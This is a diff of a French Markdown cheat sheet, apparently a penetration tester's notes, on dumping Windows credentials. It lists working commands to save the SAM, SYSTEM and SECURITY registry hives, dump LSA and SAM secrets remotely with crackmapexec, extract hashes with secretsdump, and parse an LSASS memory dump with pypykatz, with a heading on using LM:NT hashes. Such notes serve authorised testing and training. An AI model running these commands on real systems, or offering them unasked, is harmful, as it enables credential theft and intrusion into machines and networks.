@@ -2,16 +2,15 @@
 public: true # set to true to make the article publishable
 ---
 
-## Dump des credentials quand on est system
-
-### Localement
+## Localement
+### Récupération de la SAM
 ```
 reg save hklm\sam sam.save
 reg save hklm\system system.save
 reg save hklm\security security.save
 ```
 
-### A distance 
+## A distance 
 
 ```
 crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --lsa
@@ -19,8 +18,15 @@ crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam
 ```
 
 ## Extraction des Hashs
+
+### SAM
 ```
 secretdump.py local -sam sam.save -security security.save -system system.save LOCAL
+```
+
+### Dump LSASS
+```
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
 ```
 
 ## Utilisation des Hash LM:NT
